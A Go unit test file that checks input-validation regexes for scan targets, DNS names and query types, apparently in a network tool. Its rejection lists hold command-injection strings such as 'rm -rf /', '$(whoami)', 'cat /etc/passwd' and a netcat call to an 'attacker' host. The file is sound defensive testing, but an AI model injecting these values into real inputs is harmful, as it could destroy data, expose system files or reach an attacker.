package main

import "testing"

func TestTargetRegex(t *testing.T) {
	good := []string{
		"127.0.0.1", "scanme.nmap.org", "10.0.0.0/24",
		"fe80::1", "host-with-dash.example.com",
	}
	bad := []string{
		"127.0.0.1; rm -rf /",
		"$(whoami)",
		"`id`",
		"host && nmap evil.com",
		"host | nc attacker 1234",
		"host\n",
		"",
	}
	for _, s := range good {
		if !targetRe.MatchString(s) {
			t.Errorf("expected target accepted: %q", s)
		}
	}
	for _, s := range bad {
		if targetRe.MatchString(s) {
			t.Errorf("expected target REJECTED: %q", s)
		}
	}
}

func TestDnsRegex(t *testing.T) {
	good := []string{"example.com", "sub.example.co.uk", "anthropic.com"}
	bad := []string{"example.com; cat /etc/passwd", "$(id)", "a b"}
	for _, s := range good {
		if !dnsRe.MatchString(s) {
			t.Errorf("expected dns accepted: %q", s)
		}
	}
	for _, s := range bad {
		if dnsRe.MatchString(s) {
			t.Errorf("expected dns REJECTED: %q", s)
		}
	}
}

func TestQtypeRegex(t *testing.T) {
	good := []string{"A", "AAAA", "MX", "TXT", "CAA"}
	bad := []string{"a", "A; rm", "TOOLONGTYPE12"}
	for _, s := range good {
		if !qtypeRe.MatchString(s) {
			t.Errorf("expected qtype accepted: %q", s)
		}
	}
	for _, s := range bad {
		if qtypeRe.MatchString(s) {
			t.Errorf("expected qtype REJECTED: %q", s)
		}
	}
}
